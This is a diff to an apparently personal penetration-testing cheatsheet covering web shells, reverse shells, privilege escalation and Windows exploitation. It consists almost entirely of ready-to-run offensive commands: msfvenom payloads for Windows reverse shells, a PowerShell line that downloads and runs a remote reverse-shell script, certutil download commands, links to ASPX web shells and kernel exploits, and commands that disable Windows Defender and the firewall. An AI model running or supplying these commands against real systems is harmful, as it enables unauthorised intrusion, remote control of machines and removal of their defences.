@@ -81,14 +81,19 @@
 	- `/etc/knockd.conf`
 	- `nc` port several time to knock
 ### Web Shell
-- [b374k](https://github.com/b374k/b374k)
-- [windows-php-reverse-shell](https://github.com/Dhayalanb/windows-php-reverse-shell)
-
+- PHP
+	- [b374k](https://github.com/b374k/b374k)
+	- [windows-php-reverse-shell](https://github.com/Dhayalanb/windows-php-reverse-shell)
+- ASPX
+	- https://raw.githubusercontent.com/SecWiki/WebShell-2/master/Aspx/awen%20asp.net%20webshell.aspx
+	- https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx
 ## Shell
 ### Reverse Shell - Linux
 - Prepare
 	- `nc -nvlp {port}`
 	- `nc -vlk {port}`
+	- `rlwrap nc -nvlp`
+		- Support left and right
 - https://reverse-shell.sh/
 - [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 - Bash tcp
@@ -98,6 +103,14 @@
     - `python -c 'import pty; pty.spawn("/bin/bash")'`
 ### Reverse shell - Windows
 - msfvenom
+	- https://infinitelogins.com/2020/01/25/sfvenom-reverse-shell-payload-cheatsheet/
+	- aspx
+		- `msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={PORT}  -f aspx > shell.aspx`
+			- `nc` to receive
+		- `msfvenom -p windows/shell/reverse_tcp LHOST={IP} LPORT={PORT}  -f aspx > shell.aspx`
+			- msf `multi/handler` to receive
+	- exe
+		- `msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f exe > shell-x86.exe`
 - Powershell
 	- https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
 	- `powershell iex (New-Object Net.WebClient).DownloadString('http://{my_ip}:{http_port}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {my_ip} -Port {shell_port}`
@@ -125,6 +138,12 @@
 		- `wget` , `curl` , `iwr` is alias for `Invoke-WebRequest`
 			- `Invoke-WebRequest http://{my_ip}:{my_port}/{file} -outFile {file_name}`
         - `certutil -urlcache -f {URL} {File_name}`
+- Pack file
+	- cab
+		- `lcab -r {dir} {file.cab}`
+			- In kali
+		- `expand {file.cab} -F:* {Extract path}`
+			- Extract path must be absolute path like `C:\Windows\Temp`
 ## Server
 ### Redis
 - Write shell / file
@@ -213,6 +232,7 @@ Scan the system to find which can be use for privileges escalation
 - Check backup file
 ## Privilege - Windows
 ### Exploit
+- https://github.com/SecWiki/windows-kernel-exploits
 - [EternalBlue MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)
 ### Bypass UAC
 - [CVE-2019-1388](http://blog.leanote.com/post/snowming/38069f423c76)
@@ -226,7 +246,13 @@ Scan the system to find which can be use for privileges escalation
 	-  `Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet`
 -  Turn off firewall
 	- `Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False`
-
+## Check vulnerability
+- [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
+	- `systeminfo`
+		- Run in target machine and save to txt file
+	- `windows-exploit-suggester.py --update`
+		- Get new database
+	- `windows-exploit-suggester.py --database {Database file} --systeminfo {systemfile}`
 ## Password Crack
 ### Software
 - Hydra
@@ -278,4 +304,6 @@ Scan the system to find which can be use for privileges escalation
 chisel
 
 XXE
+
+
 -->
